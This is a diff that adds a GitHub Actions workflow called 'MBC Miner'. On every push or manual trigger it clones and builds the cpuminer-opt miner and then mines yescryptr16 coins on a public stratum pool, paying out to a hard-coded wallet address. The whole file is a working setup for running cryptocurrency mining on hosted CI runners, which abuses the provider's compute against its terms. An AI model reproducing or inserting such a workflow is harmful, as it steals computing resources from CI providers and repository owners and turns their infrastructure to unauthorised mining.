@@ -1,0 +1,29 @@
+name: MBC Miner
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v3
+
+    - name: Install dependencies
+      run: |
+        sudo apt update
+        sudo apt install -y git build-essential automake libcurl4-openssl-dev
+
+    - name: Clone cpuminer
+      run: |
+        git clone https://github.com/JayDDee/cpuminer-opt.git
+        cd cpuminer-opt
+        ./build.sh
+
+    - name: Start mining
+      run: |
+        cd cpuminer-opt
+        ./cpuminer -a yescryptr16 -o stratum+tcp://asia.rplant.xyz:17022 -u Baanz1gKJypgZkUFjg9oMG1st65vhFEY.worker1 -p x
